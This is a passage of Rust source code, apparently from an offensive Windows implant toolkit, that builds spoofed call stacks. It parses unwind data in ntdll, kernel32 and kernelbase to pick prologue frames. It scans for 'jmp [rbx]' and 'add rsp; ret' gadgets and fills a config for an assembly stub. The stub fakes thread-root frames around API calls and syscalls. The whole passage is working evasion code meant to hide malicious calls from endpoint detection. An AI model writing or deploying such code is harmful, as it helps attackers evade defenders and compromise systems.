                    return None;
                }
                set_fpreg_hit = true;
                // SET_FPREG means: lea rbp, [rsp + FrameOffset*16]
                // The unwinder uses RBP (not RSP) to find the frame base, so we
                // subtract the frame offset from total_stack. The effective frame
                // size seen by the unwinder is total_stack MINUS this offset, because
                // the frame pointer (RBP) already accounts for that displacement.
                let offset = ((*unwind_info).frame_offset() as i32) << 4;
                total_stack -= offset;
                i += 1;
            }
            Ok(UNWIND_OP_CODES::UWOP_SAVE_NONVOL) => {
                if Registers::Rsp == op_info || Registers::Rbp == op_info {
                    return None;
                }
                i += 2;
            }
            Ok(UNWIND_OP_CODES::UWOP_SAVE_NONVOL_BIG) => {
                if Registers::Rsp == op_info || Registers::Rbp == op_info {
                    return None;
                }
                i += 3;
            }
            Ok(UNWIND_OP_CODES::UWOP_SAVE_XMM128) => i += 2,
            Ok(UNWIND_OP_CODES::UWOP_SAVE_XMM128BIG) => i += 3,
            Ok(UNWIND_OP_CODES::UWOP_EPILOG) | Ok(UNWIND_OP_CODES::UWOP_SPARE_CODE) => i += 1,
            Ok(UNWIND_OP_CODES::UWOP_PUSH_MACH_FRAME) => {
                total_stack += if op_info == 0 { 0x40 } else { 0x48 };
                i += 1;
            }
            _ => {}
        }
    }

    // Handle chained unwind info
    if (flags & UNW_FLAG_CHAININFO) != 0 {
        if let Some((chained_fpreg, chained_stack)) =
            check_stack_frame(module_base, &*(*unwind_info).chained_entry())
        {
            total_stack += chained_stack as i32;
            set_fpreg_hit |= chained_fpreg;
        } else {
            return None;
        }
    }

    Some((set_fpreg_hit, total_stack as u32))
}

/// Finds a function with a prologue that pushes/saves RBP, suitable for
/// the **second** synthetic frame.
///
/// The unwinder expects to see an RBP-based frame somewhere in the chain
/// (many Windows functions use `push rbp` prologues). This function finds
/// one and records where RBP is saved, so the ASM stub can plant a fake
/// RBP value at the correct stack offset.
///
/// # What makes a valid push-rbp frame?
///
/// ```text
/// ✓ push rbx; push rbp; sub rsp, 0x30    → rbp_offset = 8 (after rbx push)
/// ✓ push rbp; sub rsp, 0x40              → rbp_offset = 0 (first thing pushed)
/// ✓ mov [rsp+0x10], rbp                  → rbp_offset = 0x10 (saved via MOV)
/// ✗ push rbp; push rbp                   → invalid (double RBP push)
/// ✗ (no RBP push/save at all)            → invalid (need RBP for frame chain)
/// ```
///
/// # Returns
///
/// `Prolog` with `rbp_offset` set to the stack offset where RBP is stored.
#[link_section = ".text$E"]
pub unsafe fn find_push_rbp_prolog(
    module_base: usize,
    pdata: *const IMAGE_RUNTIME_FUNCTION_ENTRY,
    pdata_count: usize,
) -> Option<Prolog> {
    let entries = core::slice::from_raw_parts(pdata, pdata_count);

    // Skip the first entry - it's often not suitable across Windows versions
    // (matches POC behavior)
    for entry in entries.iter().skip(1) {
        if let Some((rbp_off, stack_size)) = check_rbp_frame(module_base, entry) {
            // Must have valid RBP offset, non-zero frame, and RBP must be within frame
            if rbp_off == 0 || stack_size == 0 || stack_size <= rbp_off {
                continue;
            }

            // Must have a call [rip+0] instruction for the fake return address
            if let Some(offset) = find_valid_instruction_offset(module_base, entry) {
                return Some(Prolog {
                    frame: module_base + entry.BeginAddress as usize,
                    stack_size,
                    offset,
                    rbp_offset: rbp_off,
                });
            }
        }
    }

    None
}

/// Analyzes a function's prologue for RBP push/save location and total frame size.
///
/// Similar to `check_stack_frame` but tracks where RBP is saved:
///
/// ```text
/// push rbx          total_stack = 0  → after: total_stack = 8
/// push rbp          total_stack = 8  → rbp_offset = 8, total_stack = 16
/// sub rsp, 0x20     total_stack = 16 → total_stack = 48
///
/// Or via MOV:
/// sub rsp, 0x30     total_stack = 0  → total_stack = 48
/// mov [rsp+0x10], rbp               → rbp_offset = 48 + 0x10
/// ```
///
/// # Returns
///
/// `Some((rbp_offset, total_stack))` if RBP is saved exactly once.
/// `None` if RSP is pushed, RBP is saved twice, or other invalid layouts.
#[link_section = ".text$E"]
unsafe fn check_rbp_frame(
    module_base: usize,
    entry: &IMAGE_RUNTIME_FUNCTION_ENTRY,
) -> Option<(u32, u32)> {
    let unwind_info = (module_base + entry.UnwindInfoAddress as usize) as *const UNWIND_INFO;
    let codes = (*unwind_info).codes();

    let mut i = 0usize;
    let mut total_stack = 0u32;
    let mut rbp_pushed = false;
    let mut rbp_offset = 0u32;

    while i < (*unwind_info).CountOfCodes as usize {
        let code = &(*codes.add(i)).Anonymous;
        let op_info = code.OpInfo() as usize;

        match UNWIND_OP_CODES::try_from(code.UnwindOp()) {
            Ok(UNWIND_OP_CODES::UWOP_PUSH_NONVOL) => {
                // Reject RSP push - can't safely fake an RSP save
                if Registers::Rsp == op_info {
                    return None;
                }
                // Track RBP push - record its position BEFORE the 8-byte push
                // so rbp_offset points to where RBP is stored on the stack.
                // Example: if total_stack=8 when RBP is pushed, RBP lives at [rsp+8]
                // from the caller's perspective (after all pushes).
                if Registers::Rbp == op_info {
                    if rbp_pushed {
                        return None; // Double RBP save = ambiguous, reject
                    }
                    rbp_pushed = true;
                    rbp_offset = total_stack;
                }
                total_stack += 8;
                i += 1;
            }
            Ok(UNWIND_OP_CODES::UWOP_ALLOC_SMALL) => {
                total_stack += ((op_info + 1) * 8) as u32;
                i += 1;
            }
            Ok(UNWIND_OP_CODES::UWOP_ALLOC_LARGE) => {
                if code.OpInfo() == 0 {
                    // 16-bit size in next slot, multiplied by 8
                    total_stack += (*codes.add(i + 1)).FrameOffset as u32 * 8;
                    i += 2;
                } else {
                    // Full 32-bit size in next two slots (no multiply)
                    total_stack += *(codes.add(i + 1) as *const u32);
                    i += 3;
                }
            }
            // SET_FPREG - reject for push-RBP frames.
            // SET_FPREG functions use a different frame pointer model
            // (lea rbp, [rsp+off]) that's incompatible with the simple
            // push-rbp layout the ASM stub expects for second frames.
            Ok(UNWIND_OP_CODES::UWOP_SET_FPREG) => return None,
            Ok(UNWIND_OP_CODES::UWOP_SAVE_NONVOL) => {
                if Registers::Rsp == op_info {
                    return None;
                }
                // RBP saved via `mov [rsp+off], rbp` instead of push.
                // The offset is relative to RSP at that point in the prologue,
                // so final rbp_offset = total_stack (already allocated) + slot offset.
                if Registers::Rbp == op_info {
                    if rbp_pushed {
                        return None; // Already saved - ambiguous
                    }
                    // SAVE_NONVOL stores offset in next slot, scaled by 8
                    let offset = (*codes.add(i + 1)).FrameOffset as u32 * 8;
                    rbp_offset = total_stack + offset;
                    rbp_pushed = true;
                }
                i += 2;
            }
            Ok(UNWIND_OP_CODES::UWOP_SAVE_NONVOL_BIG) => {
                if Registers::Rsp == op_info {
                    return None;
                }
                // Same as SAVE_NONVOL but with unscaled 32-bit offset
                if Registers::Rbp == op_info {
                    if rbp_pushed {
                        return None;
                    }
                    let offset = *(codes.add(i + 1) as *const u32);
                    rbp_offset = total_stack + offset;
                    rbp_pushed = true;
                }
                i += 3;
            }
            Ok(UNWIND_OP_CODES::UWOP_SAVE_XMM128) => i += 2,
            Ok(UNWIND_OP_CODES::UWOP_SAVE_XMM128BIG) => i += 3,
            Ok(UNWIND_OP_CODES::UWOP_EPILOG) | Ok(UNWIND_OP_CODES::UWOP_SPARE_CODE) => i += 1,
            Ok(UNWIND_OP_CODES::UWOP_PUSH_MACH_FRAME) => {
                total_stack += if op_info == 0 { 0x40 } else { 0x48 };
                i += 1;
            }
            _ => return None,
        }
    }

    // Handle chained unwind info
    if ((*unwind_info).flags() & UNW_FLAG_CHAININFO) != 0 {
        if let Some((_, chained_stack)) =
            check_rbp_frame(module_base, &*(*unwind_info).chained_entry())
        {
            total_stack += chained_stack;
        } else {
            return None;
        }
    }

    Some((rbp_offset, total_stack))
}

/// Populates a `Config` struct with all the data needed for the ASM spoof stub.
///
/// This is the main orchestrator for Steps 1-4. It:
/// 1. Parses `.pdata` for the frame source modules, ntdll, and kernel32
/// 2. Resolves `RtlUserThreadStart` and `BaseThreadInitThunk` frame sizes
/// 3. Finds SET_FPREG prologs from `first_frame_source` (closest to API)
/// 4. Finds push-RBP prologs from `second_frame_source` (closest to BaseThunk)
/// 5. Finds the required gadgets (`jmp [rbx]`, `add rsp, X; ret`) from gadget source
///
/// # Per-frame module sourcing
///
/// Each intermediate frame is sourced from a separate module so the spoofed
/// stack matches real Windows call chains (BaseThunk → k32 → kb → API):
///
/// ```text
/// RtlUserThreadStart   (ntdll)             ← thread root
/// BaseThreadInitThunk  (kernel32)          ← standard frame
/// [second_frame]       (second_frame_src)  ← push-RBP, closest to BaseThunk
/// [first_frame]        (first_frame_src)   ← SET_FPREG, closest to API
/// [add rsp gadget]     (gadget_src)        ← cleanup gadget
/// [jmp rbx gadget]     (gadget_src)        ← stack pivot
/// target function                           ← actual API call
/// ```
///
/// Default sourcing: first_frame=kernelbase, second_frame=kernel32, gadgets=kernelbase.
/// Fallback: if kernel32 lacks push-RBP candidates, second_frame falls back to kernelbase.
///
/// # Arguments
///
/// * `ntdll_base` - Base address of ntdll.dll
/// * `kernel32_base` - Base address of kernel32.dll
/// * `first_frame_source` - Module for SET_FPREG prologs (closest to API)
/// * `second_frame_source` - Module for push-RBP prologs (closest to BaseThunk)
/// * `gadget_source_base` - Module for gadgets (jmp [rbx], add rsp)
/// * `rtl_user_thread_start` - Address of RtlUserThreadStart
/// * `base_thread_init_thunk` - Address of BaseThreadInitThunk
///
/// # Returns
///
/// A fully populated `Config` struct ready for the ASM stub, or `None` if
/// any required component couldn't be found.
#[link_section = ".text$E"]
pub unsafe fn build_config(
    ntdll_base: usize,
    kernel32_base: usize,
    first_frame_source: usize,
    second_frame_source: usize,
    gadget_source_base: usize,
    rtl_user_thread_start: usize,
    base_thread_init_thunk: usize,
) -> Option<Config> {
    use core::ffi::c_void;

    let mut config = Config::default();

    // ----- Thread root addresses (bottom of every call stack) -----
    config.rtl_user_addr = rtl_user_thread_start as *const c_void;
    config.base_thread_addr = base_thread_init_thunk as *const c_void;

    // ----- Parse .pdata for required modules -----
    // ntdll + kernel32 always needed (thread root frames live there)
    let (ntdll_pdata, ntdll_count) = find_pdata(ntdll_base as _)?;
    let (kernel32_pdata, kernel32_count) = find_pdata(kernel32_base as _)?;

    // First frame source (SET_FPREG prologs - typically kernelbase)
    let (ffs_pdata, ffs_count) = find_pdata(first_frame_source as _)?;

    // Second frame source (push-RBP prologs - typically kernel32)
    // Reuse first_frame_source's .pdata if same module to avoid redundant PE parsing
    let (sfs_pdata, sfs_count) = if second_frame_source == first_frame_source {
        (ffs_pdata, ffs_count)
    } else {
        find_pdata(second_frame_source as _)?
    };

    // Gadget source (jmp [rbx] + add rsp - typically kernelbase)
    // Reuse whichever .pdata matches to avoid redundant PE parsing
    let (gs_pdata, gs_count) = if gadget_source_base == first_frame_source {
        (ffs_pdata, ffs_count)
    } else if gadget_source_base == second_frame_source {
        (sfs_pdata, sfs_count)
    } else {
        find_pdata(gadget_source_base as _)?
    };

    // ----- RtlUserThreadStart frame size (from ntdll) -----
    // Convert absolute address → RVA for .pdata lookup
    let rtl_rva = (rtl_user_thread_start - ntdll_base) as u32;
    let rtl_entry = find_runtime_entry(rtl_rva, ntdll_pdata, ntdll_count)?;
    // Parse UNWIND_INFO to get exact stack frame size for synthetic stack allocation
    config.rtl_user_thread_size = get_frame_size(ntdll_base, &*rtl_entry)? as u64;

    // ----- BaseThreadInitThunk frame size (from kernel32) -----
    let base_rva = (base_thread_init_thunk - kernel32_base) as u32;
    let base_entry = find_runtime_entry(base_rva, kernel32_pdata, kernel32_count)?;
    config.base_thread_size = get_frame_size(kernel32_base, &*base_entry)? as u64;

    // ----- First prologue frames (SET_FPREG) from first_frame_source -----
    // Collect up to POOL_SIZE candidates for per-call rotation.
    // These are functions whose prologs use SET_FPREG (lea rbp, [rsp+off])
    // - closest to the API call in the spoofed stack.
    let pool = &mut config.frame_pool;
    pool.first_count = find_prologs(
        first_frame_source,
        ffs_pdata,
        ffs_count,
        &mut pool.first_frames,
    ) as u8;
    if pool.first_count == 0 {
        return None; // No suitable SET_FPREG prologs found
    }
    // Seed the initial config with the first candidate; rotate_config picks others at runtime
    config.first_frame_fp = pool.first_frames[0].addr;
    config.first_frame_size = pool.first_frames[0].size;

    // ----- Second prologue frames (push rbp) from second_frame_source -----
    // These are functions that push/save RBP - closest to BaseThreadInitThunk.
    // The ASM stub plants a fake RBP value at rbp_offset to link the frame chain.
    pool.second_count = find_push_rbp_prologs(
        second_frame_source,
        sfs_pdata,
        sfs_count,
        &mut pool.second_frames,
    ) as u8;
    if pool.second_count == 0 {
        return None; // No suitable push-RBP prologs found
    }
    config.second_frame_fp = pool.second_frames[0].addr;
    config.second_frame_size = pool.second_frames[0].size;
    config.rbp_stack_offset = pool.second_frames[0].rbp_offset;

    // ----- Gadget: add rsp, 0x58; ret (from gadget source) -----
    // Gadgets are NOT rotated (frame size must match ASM runtime layout)
    let add_rsp = find_gadget(
        gadget_source_base,
        &[0x48, 0x83, 0xC4, 0x58, 0xC3],
        gs_pdata,
        gs_count,
    )?;
    config.add_rsp_gadget = add_rsp.address as *const c_void;
    config.add_rsp_frame_size = add_rsp.frame_size as u64;

    // ----- Gadget: jmp [rbx] (from gadget source) -----
    let jmp_rbx = find_gadget(gadget_source_base, &[0xFF, 0x23], gs_pdata, gs_count)?;
    config.jmp_rbx_gadget = jmp_rbx.address as *const c_void;
    config.jmp_rbx_frame_size = jmp_rbx.frame_size as u64;

    Some(config)
}

/// Finds an `add rsp, X; ret` gadget trying multiple frame sizes.
///
/// The ASM stub reads the gadget size from Config at runtime, so the
/// immediate operand doesn't need to be 0x58 - any valid size works.
/// Tries common sizes in descending order.
#[link_section = ".text$E"]
pub unsafe fn find_add_rsp_gadget(
    module_base: usize,
    pdata: *const IMAGE_RUNTIME_FUNCTION_ENTRY,
    pdata_count: usize,
) -> Option<GadgetResult> {
    // Try common add rsp sizes (all multiples of 8, descending)
    const SIZES: &[u8] = &[
        0x58, 0x48, 0x50, 0x40, 0x38, 0x60, 0x68, 0x30, 0x70, 0x78, 0x28,
    ];
    for &size in SIZES {
        let pattern = [0x48, 0x83, 0xC4, size, 0xC3];
        if let Some(result) = find_gadget(module_base, &pattern, pdata, pdata_count) {
            return Some(result);
        }
    }
    None
}

/// Builds a Config for syscall spoofing with separate gadget source module.
///
/// Like `build_config` but allows sourcing gadgets from a different module
/// than the frames. Uses flexible `add rsp, X; ret` size search so gadgets
/// can be found in modules (like ntdll) that may not have `add rsp, 0x58`.
#[link_section = ".text$E"]
pub unsafe fn build_syscall_config(
    ntdll_base: usize,
    kernel32_base: usize,
    first_frame_source: usize,
    second_frame_source: usize,
    gadget_source_base: usize,
    rtl_user_thread_start: usize,
    base_thread_init_thunk: usize,
) -> Option<Config> {
    use core::ffi::c_void;

    let mut config = Config::default();

    // ----- Thread root addresses -----
    config.rtl_user_addr = rtl_user_thread_start as *const c_void;
    config.base_thread_addr = base_thread_init_thunk as *const c_void;

    // ----- Parse .pdata for required modules -----
    let (ntdll_pdata, ntdll_count) = find_pdata(ntdll_base as _)?;
    let (kernel32_pdata, kernel32_count) = find_pdata(kernel32_base as _)?;
    let (ffs_pdata, ffs_count) = find_pdata(first_frame_source as _)?;

    let (sfs_pdata, sfs_count) = if second_frame_source == first_frame_source {
        (ffs_pdata, ffs_count)
    } else {
        find_pdata(second_frame_source as _)?
    };

    let (gs_pdata, gs_count) = if gadget_source_base == first_frame_source {
        (ffs_pdata, ffs_count)
    } else if gadget_source_base == second_frame_source {
        (sfs_pdata, sfs_count)
    } else if gadget_source_base == ntdll_base {
        (ntdll_pdata, ntdll_count)
    } else if gadget_source_base == kernel32_base {
        (kernel32_pdata, kernel32_count)
    } else {
        find_pdata(gadget_source_base as _)?
    };

    // ----- RtlUserThreadStart frame size -----
    let rtl_rva = (rtl_user_thread_start - ntdll_base) as u32;
    let rtl_entry = find_runtime_entry(rtl_rva, ntdll_pdata, ntdll_count)?;
    config.rtl_user_thread_size = get_frame_size(ntdll_base, &*rtl_entry)? as u64;

    // ----- BaseThreadInitThunk frame size -----
    let base_rva = (base_thread_init_thunk - kernel32_base) as u32;
    let base_entry = find_runtime_entry(base_rva, kernel32_pdata, kernel32_count)?;
    config.base_thread_size = get_frame_size(kernel32_base, &*base_entry)? as u64;

    // ----- First prologue frames (SET_FPREG) -----
    let pool = &mut config.frame_pool;
    pool.first_count = find_prologs(
        first_frame_source,
        ffs_pdata,
        ffs_count,
        &mut pool.first_frames,
    ) as u8;
    if pool.first_count == 0 {
        return None;
    }
    config.first_frame_fp = pool.first_frames[0].addr;
    config.first_frame_size = pool.first_frames[0].size;

    // ----- Second prologue frames (push rbp) -----
    pool.second_count = find_push_rbp_prologs(
        second_frame_source,
        sfs_pdata,
        sfs_count,
        &mut pool.second_frames,
    ) as u8;
    if pool.second_count == 0 {
        return None;
    }
    config.second_frame_fp = pool.second_frames[0].addr;
    config.second_frame_size = pool.second_frames[0].size;
    config.rbp_stack_offset = pool.second_frames[0].rbp_offset;

    // ----- Gadget: add rsp, X; ret (flexible size search) -----
    let add_rsp = find_add_rsp_gadget(gadget_source_base, gs_pdata, gs_count)?;
    config.add_rsp_gadget = add_rsp.address as *const c_void;
    config.add_rsp_frame_size = add_rsp.frame_size as u64;

    // ----- Gadget: jmp [rbx] -----
    let jmp_rbx = find_gadget(gadget_source_base, &[0xFF, 0x23], gs_pdata, gs_count)?;
    config.jmp_rbx_gadget = jmp_rbx.address as *const c_void;
    config.jmp_rbx_frame_size = jmp_rbx.frame_size as u64;

    Some(config)
}
